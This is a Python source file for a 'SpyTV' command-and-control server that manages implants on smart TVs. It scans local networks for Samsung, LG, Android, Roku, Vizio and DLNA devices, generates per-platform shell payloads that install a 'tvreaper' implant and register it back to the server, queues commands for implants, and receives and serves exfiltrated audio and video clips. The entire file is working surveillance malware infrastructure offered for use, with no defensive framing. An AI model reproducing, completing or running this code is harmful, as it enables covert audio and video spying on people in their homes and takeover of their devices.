#!/usr/bin/env python3
"""SpyTV C2 Server: Web-based dashboard for managing TV implants.
Handles audio/video exfiltration, device control, command dispatch,
network scanning, and payload generation.
"""
import json
import os
import base64
import hashlib
import datetime
import threading
import time
import socket
import struct
import subprocess
import platform
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

# Configuration
C2_HOST = "0.0.0.0"
C2_PORT = 8443
STORE_DIR = os.path.join("c2_data", "clips")
DEVICE_FILE = os.path.join("c2_data", "devices.json")
COMMAND_FILE = os.path.join("c2_data", "commands.json")
SCAN_FILE = os.path.join("c2_data", "scans.json")
LOGO_FILE = "logo.png"

os.makedirs(STORE_DIR, exist_ok=True)
os.makedirs(os.path.join(STORE_DIR, "audio"), exist_ok=True)
os.makedirs(os.path.join(STORE_DIR, "video"), exist_ok=True)

# Device registry
devices = {}
devices_lock = threading.Lock()

# Command queue
commands = {}
commands_lock = threading.Lock()

# Scan results
scans = []
scans_lock = threading.Lock()


def get_local_ip():
    """Get the local IP address of this machine."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def load_devices():
    global devices
    if os.path.exists(DEVICE_FILE):
        try:
            with open(DEVICE_FILE, 'r') as f:
                devices = json.load(f)
        except (json.JSONDecodeError, IOError):
            devices = {}


def save_devices():
    with devices_lock:
        try:
            with open(DEVICE_FILE, 'w') as f:
                json.dump(devices, f, indent=2)
        except IOError:
            pass


def load_commands():
    global commands
    if os.path.exists(COMMAND_FILE):
        try:
            with open(COMMAND_FILE, 'r') as f:
                commands = json.load(f)
        except (json.JSONDecodeError, IOError):
            commands = {}


def save_commands():
    with commands_lock:
        try:
            with open(COMMAND_FILE, 'w') as f:
                json.dump(commands, f, indent=2)
        except IOError:
            pass


def load_scans():
    global scans
    if os.path.exists(SCAN_FILE):
        try:
            with open(SCAN_FILE, 'r') as f:
                scans = json.load(f)
        except (json.JSONDecodeError, IOError):
            scans = []


def save_scans():
    with scans_lock:
        try:
            with open(SCAN_FILE, 'w') as f:
                json.dump(scans, f, indent=2)
        except IOError:
            pass


def get_device_id(ip):
    return hashlib.sha1(ip.encode()).hexdigest()[:12]


def scan_network(cidr=None):
    """Scan local network for vulnerable TVs using port scanning."""
    if cidr is None:
        local_ip = get_local_ip()
        cidr = f"{local_ip.rsplit('.', 1)[0]}.0/24"

    results = []
    base_ip = cidr.split('/')[0].rsplit('.', 1)[0]

    # Common TV ports to scan
    tv_ports = [5555, 22, 80, 554, 8080, 1900, 7676, 3000, 8060, 36669, 8009, 49152]

    for i in range(1, 255):
        ip = f"{base_ip}.{i}"
        open_ports = []
        for port in tv_ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                result = s.connect_ex((ip, port))
                s.close()
                if result == 0:
                    open_ports.append(port)
            except Exception:
                pass

        if open_ports:
            # Try to identify device type
            device_type = "Unknown"
            if 5555 in open_ports:
                device_type = "Android TV/Fire TV"
            elif 7676 in open_ports:
                device_type = "Samsung Tizen"
            elif 3000 in open_ports:
                device_type = "LG webOS"
            elif 8060 in open_ports:
                device_type = "Roku"
            elif 36669 in open_ports:
                device_type = "Vizio"
            elif 8009 in open_ports:
                device_type = "Chromecast"

            results.append({
                "ip": ip,
                "open_ports": open_ports,
                "device_type": device_type,
                "vulnerable": len(open_ports) > 0,
                "scanned_at": datetime.datetime.utcnow().isoformat() + "Z"
            })

    return results


def generate_payload(target_ip, family, c2_ip):
    """Generate an exploit payload that connects back to the C2."""
    payload_url = f"http://{c2_ip}:{C2_PORT}/api/exfil"

    if family == "tizen-dev":
        payload = f"""#!/bin/bash
# Tizen Dev Mode Exploit Payload
# Target: {target_ip}
# C2: {c2_ip}:{C2_PORT}
echo "Installing Tizen implant on {target_ip}..."
sdb connect {target_ip}:26101
sdb install tvreaper.wgt
# Register with C2
curl -X POST http://{c2_ip}:{C2_PORT}/api/register \\
  -H "Content-Type: application/json" \\
  -d '{{"ip":"{target_ip}","family":"Samsung(Tizen)","entry":"tizen-dev"}}'
echo "Implant installed. C2: {c2_ip}"
"""
    elif family == "webos-dev":
        payload = f"""#!/bin/bash
# webOS ares-install Exploit Payload
# Target: {target_ip}
# C2: {c2_ip}:{C2_PORT}
echo "Installing webOS implant on {target_ip}..."
ares-install --device tv@{target_ip} tvreaper.ipk
curl -X POST http://{c2_ip}:{C2_PORT}/api/register \\
  -H "Content-Type: application/json" \\
  -d '{{"ip":"{target_ip}","family":"LG(webOS)","entry":"webos-dev"}}'
echo "Implant installed. C2: {c2_ip}"
"""
    elif family == "adb-net":
        payload = f"""#!/bin/bash
# Android TV ADB Exploit Payload
# Target: {target_ip}
# C2: {c2_ip}:{C2_PORT}
echo "Installing Android TV implant on {target_ip}..."
adb connect {target_ip}:5555
adb -s {target_ip}:5555 install tvreaper.apk
curl -X POST http://{c2_ip}:{C2_PORT}/api/register \\
  -H "Content-Type: application/json" \\
  -d '{{"ip":"{target_ip}","family":"AndroidTV","entry":"adb-net"}}'
echo "Implant installed. C2: {c2_ip}"
"""
    elif family == "roku-ecp":
        payload = f"""#!/bin/bash
# Roku ECP Exploit Payload
# Target: {target_ip}
# C2: {c2_ip}:{C2_PORT}
echo "Installing Roku implant on {target_ip}..."
curl -X POST http://{target_ip}:8060/install/851
curl -X POST http://{c2_ip}:{C2_PORT}/api/register \\
  -H "Content-Type: application/json" \\
  -d '{{"ip":"{target_ip}","family":"RokuTV","entry":"roku-ecp"}}'
echo "Implant installed. C2: {c2_ip}"
"""
    elif family == "vizio-dial":
        payload = f"""#!/bin/bash
# Vizio DIAL Exploit Payload
# Target: {target_ip}
# C2: {c2_ip}:{C2_PORT}
echo "Installing Vizio implant on {target_ip}..."
curl -X POST http://{target_ip}:24825/apps/com.forge.tvreaper
curl -X POST http://{c2_ip}:{C2_PORT}/api/register \\
  -H "Content-Type: application/json" \\
  -d '{{"ip":"{target_ip}","family":"Vizio","entry":"vizio-dial"}}'
echo "Implant installed. C2: {c2_ip}"
"""
    else:
        payload = f"""#!/bin/bash
# Generic DLNA Exploit Payload
# Target: {target_ip}
# C2: {c2_ip}:{C2_PORT}
echo "Attempting DLNA injection on {target_ip}..."
curl -X POST http://{target_ip}:49152/upnp/control/AVTransport \\
  -H "Content-Type: text/xml" \\
  -H "SOAPAction: urn:schemas-upnp-org:service:AVTransport:1#SetAVTransportURI" \\
  -d '<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><u:SetAVTransportURI xmlns:u="urn:schemas-upnp-org:service:AVTransport:1"><InstanceID>0</InstanceID><CurrentURI>http://{c2_ip}/tvreaper.js</CurrentURI></u:SetAVTransportURI></s:Body></s:Envelope>'
curl -X POST http://{c2_ip}:{C2_PORT}/api/register \\
  -H "Content-Type: application/json" \\
  -d '{{"ip":"{target_ip}","family":"Unknown","entry":"dlna"}}'
echo "Implant attempted. C2: {c2_ip}"
"""

    return payload


class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path

        if path == "/" or path == "/index.html":
            self.serve_dashboard()
        elif path == "/api/devices":
            self.serve_devices()
        elif path == "/api/clips":
            self.serve_clips()
        elif path.startswith("/api/clip/"):
            self.serve_clip(path)
        elif path == "/api/commands":
            self.serve_commands()
        elif path == "/api/scans":
            self.serve_scans()
        elif path == "/api/local_ip":
            self.send_json(200, {"ip": get_local_ip()})
        elif path == "/logo.png":
            self.serve_logo()
        else:
            self.send_error(404)

    def do_POST(self):
        parsed = urlparse(self.path)
        path = parsed.path

        if path == "/api/register":
            self.handle_register()
        elif path == "/api/exfil":
            self.handle_exfil()
        elif path == "/api/command":
            self.handle_command()
        elif path == "/api/poll":
            self.handle_poll()
        elif path == "/api/scan":
            self.handle_scan()
        elif path == "/api/payload":
            self.handle_payload()
        else:
            self.send_error(404)

    def serve_dashboard(self):
        html_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "c2_dashboard.html")
        try:
            with open(html_path, 'r', encoding='utf-8') as f:
                html = f.read()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(html.encode('utf-8'))
        except IOError:
            self.send_error(404)

    def serve_devices(self):
        with devices_lock:
            self.send_json(200, list(devices.values()))

    def serve_clips(self):
        clips = []
        for root, dirs, files in os.walk(STORE_DIR):
            for f in files:
                if f.endswith(('.wav', '.jpeg', '.jpg', '.png', '.ts')):
                    rel = os.path.relpath(os.path.join(root, f), STORE_DIR)
                    parts = rel.replace('\\', '/').split('/')
                    if len(parts) >= 2:
                        kind = parts[0]
                        fname = parts[-1]
                        device_id = fname.split('_')[0] if '_' in fname else 'unknown'
                        clips.append({
                            "id": hashlib.sha1(rel.encode()).hexdigest()[:12],
                            "device_id": device_id,
                            "kind": kind,
                            "filename": fname,
                            "path": rel,
                            "size": os.path.getsize(os.path.join(root, f)),
                            "timestamp": os.path.getctime(os.path.join(root, f))
                        })
        self.send_json(200, clips)

    def serve_clip(self, path):
        clip_id = path.split("/")[-1]
        for root, dirs, files in os.walk(STORE_DIR):
            for f in files:
                rel = os.path.relpath(os.path.join(root, f), STORE_DIR)
                cid = hashlib.sha1(rel.encode()).hexdigest()[:12]
                if cid == clip_id:
                    full_path = os.path.join(root, f)
                    content_type = "audio/wav" if f.endswith('.wav') else \
                                   "image/jpeg" if f.endswith(('.jpeg', '.jpg')) else \
                                   "image/png" if f.endswith('.png') else \
                                   "video/mp2t" if f.endswith('.ts') else "application/octet-stream"
                    try:
                        with open(full_path, 'rb') as fh:
                            data = fh.read()
                        self.send_response(200)
                        self.send_header("Content-Type", content_type)
                        self.send_header("Content-Length", str(len(data)))
                        self.end_headers()
                        self.wfile.write(data)
                        return
                    except IOError:
                        pass
        self.send_error(404)

    def serve_commands(self):
        with commands_lock:
            self.send_json(200, commands)

    def serve_scans(self):
        with scans_lock:
            self.send_json(200, scans)

    def serve_logo(self):
        try:
            with open(LOGO_FILE, 'rb') as f:
                data = f.read()
            self.send_response(200)
            self.send_header("Content-Type", "image/png")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
        except IOError:
            self.send_error(404)

    def handle_register(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            data = json.loads(body)
            ip = data.get('ip', '')
            family = data.get('family', 'unknown')
            entry = data.get('entry', 'unknown')
            if not ip:
                self.send_json(400, {"error": "Missing IP"})
                return
            device_id = get_device_id(ip)
            with devices_lock:
                devices[device_id] = {
                    "id": device_id,
                    "ip": ip,
                    "family": family,
                    "entry": entry,
                    "status": "online",
                    "last_seen": datetime.datetime.utcnow().isoformat() + "Z",
                    "registered_at": devices.get(device_id, {}).get("registered_at",
                        datetime.datetime.utcnow().isoformat() + "Z")
                }
            save_devices()
            self.send_json(200, {"status": "ok", "device_id": device_id})
        except (json.JSONDecodeError, IOError) as e:
            self.send_json(400, {"error": str(e)})

    def handle_exfil(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            content_type = self.headers.get('Content-Type', '')
            device_id = self.headers.get('X-Device-ID', 'unknown')
            kind = self.headers.get('X-Clip-Kind', 'audio')

            if 'multipart/form-data' in content_type:
                boundary = content_type.split('boundary=')[-1].strip()
                parts = body.split(f'--{boundary}'.encode())
                for part in parts:
                    if b'filename=' in part:
                        header_end = part.find(b'\r\n\r\n')
                        if header_end > 0:
                            file_data = part[header_end + 4:]
                            if file_data.endswith(b'\r\n'):
                                file_data = file_data[:-2]
                            break
                else:
                    file_data = body
            else:
                file_data = body

            timestamp = datetime.datetime.utcnow().strftime('%H%M%S')
            date_dir = datetime.datetime.utcnow().strftime('%Y%m%d')
            kind_dir = os.path.join(STORE_DIR, kind, date_dir)
            os.makedirs(kind_dir, exist_ok=True)
            filename = f"{device_id}_{timestamp}.{'wav' if kind == 'audio' else 'jpeg'}"
            filepath = os.path.join(kind_dir, filename)
            with open(filepath, 'wb') as f:
                f.write(file_data)

            with devices_lock:
                if device_id in devices:
                    devices[device_id]["last_seen"] = datetime.datetime.utcnow().isoformat() + "Z"
                    devices[device_id]["status"] = "online"
                    save_devices()

            self.send_json(200, {"status": "ok", "filename": filename})
        except Exception as e:
            self.send_json(500, {"error": str(e)})

    def handle_command(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            data = json.loads(body)
            device_id = data.get('device_id', '')
            command = data.get('command', '')
            params = data.get('params', {})

            if not device_id or not command:
                self.send_json(400, {"error": "Missing device_id or command"})
                return

            with commands_lock:
                if device_id not in commands:
                    commands[device_id] = []
                commands[device_id].append({
                    "command": command,
                    "params": params,
                    "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
                    "status": "pending"
                })
            save_commands()
            self.send_json(200, {"status": "ok"})
        except (json.JSONDecodeError, IOError) as e:
            self.send_json(400, {"error": str(e)})

    def handle_poll(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            data = json.loads(body)
            device_id = data.get('device_id', '')

            with commands_lock:
                device_commands = commands.get(device_id, [])
                pending = [c for c in device_commands if c["status"] == "pending"]
                for c in pending:
                    c["status"] = "delivered"
                commands[device_id] = [c for c in device_commands if c["status"] != "delivered"]

            with devices_lock:
                if device_id in devices:
                    devices[device_id]["last_seen"] = datetime.datetime.utcnow().isoformat() + "Z"
                    devices[device_id]["status"] = "online"
                    save_devices()

            self.send_json(200, {"commands": pending})
        except (json.JSONDecodeError, IOError) as e:
            self.send_json(400, {"error": str(e)})

    def handle_scan(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            data = json.loads(body)
            cidr = data.get('cidr', None)

            results = scan_network(cidr)

            with scans_lock:
                scans.extend(results)
                # Keep only last 100 scans
                scans = scans[-100:]
                save_scans()

            self.send_json(200, {"status": "ok", "found": len(results), "results": results})
        except Exception as e:
            self.send_json(500, {"error": str(e)})

    def handle_payload(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            data = json.loads(body)
            target_ip = data.get('target_ip', '')
            family = data.get('family', 'dlna')
            c2_ip = data.get('c2_ip', get_local_ip())

            if not target_ip:
                self.send_json(400, {"error": "Missing target_ip"})
                return

            payload = generate_payload(target_ip, family, c2_ip)
            self.send_json(200, {"status": "ok", "payload": payload, "target_ip": target_ip, "family": family, "c2_ip": c2_ip})
        except Exception as e:
            self.send_json(500, {"error": str(e)})

    def send_json(self, code, data):
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())


def main():
    load_devices()
    load_commands()
    load_scans()
    server = HTTPServer((C2_HOST, C2_PORT), C2Handler)
    local_ip = get_local_ip()
    print(f"C2 Server running on http://{C2_HOST}:{C2_PORT}")
    print(f"Local IP: {local_ip}")
    print(f"Dashboard: http://{local_ip}:{C2_PORT}/")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down C2...")
        server.shutdown()


if __name__ == "__main__":
    main()
